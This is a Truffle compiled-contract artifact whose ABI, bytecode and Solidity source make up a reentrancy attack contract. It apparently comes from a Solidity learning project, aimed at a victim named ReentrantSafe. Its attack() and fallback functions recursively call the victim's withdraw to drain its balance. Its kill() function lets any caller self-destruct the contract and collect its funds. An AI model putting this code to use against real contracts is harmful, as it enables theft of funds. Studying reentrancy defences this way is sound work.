{
  "contractName": "ReentrantAttackerFailed",
  "abi": [
    {
      "constant": false,
      "inputs": [],
      "name": "kill",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "victim",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_address",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    }
  ],
  "bytecode": "0x6060604052341561000f57600080fd5b6040516020806103bf83398101604052808051906020019091905050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506103448061007b6000396000f300606060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806341c0e1b514610133578063930c2003146101485780639e5faafc1461019d575b346000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631101515610131576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561011c57600080fd5b6102c65a03f1151561012d57600080fd5b5050505b005b341561013e57600080fd5b6101466101a7565b005b341561015357600080fd5b61015b6101c0565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101a56101e5565b005b3373ffffffffffffffffffffffffffffffffffffffff16ff5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b151561026957600080fd5b6125ee5a03f1151561027a57600080fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561030257600080fd5b6102c65a03f1151561031357600080fd5b5050505600a165627a7a723058207919095967d7f47a6e52fb42b4118ecf7ca3e7c6018d66c1d56559a2a35215a00029",
  "source": "pragma solidity ^0.4.18;\r\nimport \"./ReentrantSafe.sol\";\r\n\r\n/// This contract would be owned by the attacker\r\ncontract ReentrantAttackerFailed {\r\n    ReentrantSafe public victim; // the contract instance I want to attack\r\n\r\n    /// Constructor\r\n    function ReentrantAttackerFailed(address _address) public {\r\n        // _address is the address of the deployed ReentrantSafe instance\r\n        // See 4_initial_migration.js\r\n        // deployer.deploy(ReentrantAttacker, ReentrantSafe.address) \r\n        victim = ReentrantSafe(_address);\r\n    }\r\n\r\n    /// Destroy this contract instance\r\n    function kill() public {\r\n        selfdestruct(msg.sender); // Caller will get back all the balance from this contract instance\r\n                                  // See Ownable.sol for a proper implementattion of kill()\r\n    }\r\n\r\n    /// Caller just provide a small amount to this function\r\n    /// the victim's balance will drained recursively\r\n    function attack() public payable {\r\n        victim.deposit.value(msg.value)(); // sender/attacker can deposit a small amount\r\n        victim.withdraw(); // victim's withdraw function is not re-entrant safe\r\n                           // below fallback will be invoked\r\n    }\r\n\r\n    function () public payable {\r\n        // this fallback will be recursively called by calling victim's withdraw\r\n        // to prevent infinite recursive stackoverflow or out of gas\r\n        // the stop condition is when victim's balance is less than attacking amount.\r\n        if (victim.balance >= msg.value) {\r\n            victim.withdraw();\r\n        }\r\n    }\r\n}",
  "sourcePath": "C:\\dev\\ethereum\\solidity\\basics\\contracts\\ReentrantAttackerFailed.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.18+commit.9cf6e910.Emscripten.clang"
  },
  "schemaVersion": "1.0.1",
  "updatedAt": "2017-12-08T03:20:07.945Z"
}